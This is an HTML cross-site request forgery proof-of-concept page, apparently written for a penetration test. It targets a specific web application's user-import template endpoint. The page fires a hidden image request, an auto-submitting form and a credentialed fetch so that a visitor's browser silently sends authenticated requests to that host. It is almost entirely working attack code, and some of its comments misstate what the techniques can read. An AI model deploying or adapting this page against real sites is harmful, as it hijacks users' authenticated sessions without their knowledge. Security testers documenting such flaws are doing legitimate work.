<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Template Download</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This page will silently make an authenticated request to download the user import template.</p>

    <!-- Technique 1: img tag (GET only, steals response if CORS allows) -->
    <img src="https://ptst.app.welfordacademy.com/api/wac/users/import/template.csv"
         style="display:none;"
         onerror="console.log('CSRF img fired (error expected for binary/non-image)')"
    />

    <!-- Technique 2: Auto-submitting form (more reliable, works across origins) -->
    <form id="csrfForm" action="https://ptst.app.welfordacademy.com/api/wac/users/import/template.csv" method="GET">
        <input type="submit" value="Click to trigger (auto-submits in 1 sec)">
    </form>

    <script>
        // Auto-submit the form after 1 second
        setTimeout(function() {
            document.getElementById('csrfForm').submit();
        }, 1000);

        // Also try via fetch (if CORS permits — same-origin only by default)
        // This may fail cross-origin; the form/img methods do NOT require JS/CORS
        fetch('https://ptst.app.welfordacademy.com/api/wac/users/import/template.csv', {
            credentials: 'include'
        }).then(r => console.log('Fetch CSRF status:', r.status));
    </script>
</body>
</html>
